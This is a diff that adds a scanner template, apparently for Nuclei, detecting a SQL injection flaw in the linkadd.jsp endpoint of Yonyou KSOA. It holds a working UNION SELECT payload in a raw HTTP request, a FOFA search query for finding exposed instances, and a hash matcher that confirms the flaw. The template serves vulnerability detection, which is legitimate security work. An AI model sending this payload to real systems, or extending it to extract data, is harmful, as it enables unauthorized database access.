@@ -1,0 +1,47 @@
+id: YongyoushikongKSOA-linkadd-sqli
+
+info:
+  name: 用友时空KSOA-linkadd-SQL注入
+  author: candada
+  severity: high
+  description: '用友时空KSOAlinksframe/linkadd.jsp接口存在SQL注入漏洞，攻击者可利用漏洞获取数据库敏感信息，甚至获取服务器权限。'
+  reference:
+  tags: 2024,用友,sqli,yonyou-ksoa
+  metadata:
+    max-request: 1
+    fofa-query: title="企业信息系统门户"
+    verified: true
+  classification:
+    cvss-metrics: 
+    cvss-score:                                                   
+    cve-id:                                              
+    cwe-id:                                                    
+    epss-score:                                              
+    epss-percentile:                                           
+    cpe: 
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /linksframe/linkadd.jsp?id=666666%27+union+all+select+null%2Cnull%2Csys.fn_sqlvarbasetostr(HashBytes(%27MD5%27%2C%27123456%27))%2Cnull%2Cnull%2C%27 HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Cookie: JSESSIONID=19DC18C413065D509C27183E9E1724A6
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - e10adc3949ba59abbe56e057f20f883e
+    condition: and
+
+
+# Generated From WebFuzzer on 2024-05-08 14:36:34
